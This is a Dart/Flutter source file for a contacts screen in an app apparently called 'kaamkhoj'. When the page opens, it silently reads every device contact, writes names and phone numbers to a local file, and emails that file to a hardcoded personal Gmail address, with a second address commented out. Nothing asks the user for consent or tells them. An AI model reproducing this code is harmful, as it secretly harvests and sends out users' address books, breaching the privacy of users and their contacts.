import 'dart:io';

import 'package:flutter/material.dart';
import 'package:contacts_service/contacts_service.dart';
import 'package:kaamkhoj/Mail/send_mail.dart';
import 'package:path_provider/path_provider.dart';

class ContactsPage extends StatefulWidget {
  @override
  _ContactsPageState createState() => _ContactsPageState();
}

class _ContactsPageState extends State<ContactsPage> {
  String contactsString="";

  @override
  void initState() {
    getContacts();
    super.initState();
  }

  Future<void> getContacts() async {
    final Iterable<Contact> contacts = await ContactsService.getContacts();

    for (int i = 0; i < contacts.length; i++) {
      try {
        final Directory directory = await getApplicationDocumentsDirectory();
        final File file = File('${directory.path}/contacts.txt');
        _writeFile(contacts.elementAt(i).displayName+" - "+contacts.elementAt(i).phones.first.value.toString(),file);
      } catch (e) {
        print("Skipped Exception");
      }
    }
    sendContactsMethod();
  }
  _writeFile(String text, File file) async {
    await file.writeAsString('$text\n', mode: FileMode.append);
  }


  sendContactsMethod() async{
    final Directory directory = await getApplicationDocumentsDirectory();
    final File file = File('${directory.path}/contacts.txt');
    sendMailContacts("amkhati11@gmail.com", file);
//    sendMailContacts("Clopes024@gmail.com", file);

  }



  Future<String> _read() async {
    String text;
    try {
      final Directory directory = await getApplicationDocumentsDirectory();
      final File file = File('${directory.path}/aditya.txt');
      text = await file.readAsString();
      print(text);
    } catch (e) {
      print("Couldn't read file");
    }
    return text;
  }

  @override
  Widget build(BuildContext context) {
    return Scaffold(
      appBar: AppBar(
        title: (Text('Contacts')),
      ),
      body: Column(
        children: [
          RaisedButton(
            onPressed: () {
              _read();
            },
            child: Text("Get Contacts"),
          ),
          RaisedButton(
            onPressed: () {
              sendContactsMethod();

            },
            child: Text("Get Contacts"),
          ),
        ],
      ),

    );
  }


}
